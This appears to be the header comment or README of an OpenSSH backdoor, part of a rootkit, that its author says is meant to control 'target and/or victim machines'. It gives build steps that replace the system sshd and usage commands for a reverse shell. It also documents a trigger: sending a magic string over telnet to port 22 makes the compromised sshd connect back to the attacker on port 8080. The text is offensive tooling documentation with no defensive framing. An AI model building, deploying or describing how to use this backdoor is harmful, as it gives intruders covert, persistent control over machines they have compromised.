#  udc-hackssh_bajaulaut is an openssh backdoor combined with reverse shell capability
#   and part of udc-kolansong rootkit. The idea was to make use of openssh binary to
#  control target and/or victim machines.
#
# todo:
#  - read remote port parameter
#  - *magic* private key authentication
#
# compile:   
#   apt-get install libssl-dev libpam0g-dev librkb5-dev
#   wget http://openbsd.org.ar/pub/OpenBSD/OpenSSH/portable/openssh-6.0p1.tar.gz
#  ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5
#
# howto:
#  client:
#    'ssh -8 udc -p 880' to connect to udc:880 where a client must listen
#
#   server:
#    'sshd -8 udc -p 880' to wait for incoming connects on port 880
#
#  Or if you received something like "ssh_exchange_identification: Connection 
#  closed by remote host", you can telnet to target machines and issue 
#  'udc_gamai_magic' string. Once udc_gamai_magic is sent, sshd will then execute and
#  connect to your 'client' machine on port 8080.
#
#                telnet target_machines.com 22
#                CHANGE_ME
#                Protocol mismatch.
#                Connection closed by foreign host.
#
# limitation:
#  This version will ONLY execute reverse openssh command to the machine which executed 
#  telnet command. 